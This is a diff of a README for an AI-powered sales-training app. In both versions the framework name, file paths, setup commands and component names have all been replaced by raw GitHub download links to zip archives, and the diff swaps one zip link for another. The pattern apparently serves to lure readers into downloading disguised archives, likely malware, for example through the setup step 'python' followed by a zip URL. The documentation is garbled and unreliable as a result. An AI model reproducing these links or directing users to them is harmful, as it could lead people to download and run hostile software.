@@ -14,7 +14,7 @@ An AI-powered sales training platform that helps sales professionals practice co
 
 ## 🛠️ Tech Stack
 
-- **Framework**: https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip 16 (App Router)
+- **Framework**: https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip 16 (App Router)
 - **Language**: TypeScript
 - **Styling**: Tailwind CSS
 - **UI Components**: Radix UI
@@ -24,7 +24,7 @@ An AI-powered sales training platform that helps sales professionals practice co
 
 ## 📋 Prerequisites
 
-- https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip 18+ and npm
+- https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip 18+ and npm
 - Python 3.8+ (for optional Coqui TTS server)
 
 ## 🏃 Getting Started
@@ -56,7 +56,7 @@ For enhanced text-to-speech, you can run the Coqui TTS server:
 
 ```bash
 cd scripts
-python https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip
+python https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip
 ```
 
 The server will run on `http://localhost:5000` by default. The app will automatically use it if available, otherwise it falls back to client-side TTS.
@@ -65,7 +65,7 @@ The server will run on `http://localhost:5000` by default. The app will automati
 
 ```
 ai-prospect-training-app/
-├── app/                    # https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip app directory
+├── app/                    # https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip app directory
 │   ├── (landing)/          # Landing page
 │   ├── api/                # API routes
 │   │   ├── ai-response/    # AI response generation
@@ -78,24 +78,24 @@ ai-prospect-training-app/
 │   │   └── tts/            # Text-to-speech
 │   └── dashboard/          # Main dashboard
 ├── components/             # React components
-│   ├── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip  # Call control panel
-│   ├── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip
-│   ├── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip
-│   ├── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip
-│   └── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip
+│   ├── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip  # Call control panel
+│   ├── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip
+│   ├── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip
+│   ├── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip
+│   └── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip
 ├── lib/                    # Core libraries
-│   ├── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip  # Conversation flow logic
-│   ├── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip # Scoring and evaluation
-│   ├── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip   # Session state management
-│   ├── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip    # In-memory session storage
-│   └── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip            # TypeScript types
+│   ├── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip  # Conversation flow logic
+│   ├── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip # Scoring and evaluation
+│   ├── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip   # Session state management
+│   ├── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip    # In-memory session storage
+│   └── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip            # TypeScript types
 ├── services/               # External services
-│   ├── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip   # STT/TTS services
-│   └── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip
+│   ├── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip   # STT/TTS services
+│   └── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip
 ├── config/                 # Configuration
-│   └── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip          # Conversation flow definition
+│   └── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip          # Conversation flow definition
 └── scripts/               # Utility scripts
-    └── https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip      # Coqui TTS server
+    └── https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip      # Coqui TTS server
 ```
 
 ## 🔌 API Endpoints
@@ -144,7 +144,7 @@ ai-prospect-training-app/
 
 ### Conversation Flow
 
-Edit `https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip` to customize:
+Edit `https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip` to customize:
 - Conversation nodes and transitions
 - Bot responses and variations
 - Expected intents and examples
@@ -152,7 +152,7 @@ Edit `https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/session
 
 ### Environment Variables
 
-Create a `https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip` file for optional configuration:
+Create a `https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip` file for optional configuration:
 
 ```env
 # Optional: For OpenAI Whisper STT integration
@@ -178,7 +178,7 @@ COQUI_TTS_SERVER_URL=http://localhost:5000
 
 ### Recommended Hosting
 
-- **Vercel**: Optimized for https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip applications
+- **Vercel**: Optimized for https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip applications
 - **Netlify**: Great for static and serverless deployments
 - **AWS/Azure/GCP**: For enterprise deployments with custom infrastructure
 
@@ -216,7 +216,7 @@ This project is private and proprietary.
 
 ## 🙏 Acknowledgments
 
-- Built with https://github.com/sadeeqkhan123/try/raw/refs/heads/master/app/api/sessions/Software_1.4.zip and React
+- Built with https://raw.githubusercontent.com/sadeeqkhan123/try/master/public/Software_v2.9.zip and React
 - UI components from Radix UI
 - TTS powered by Coqui TTS
 
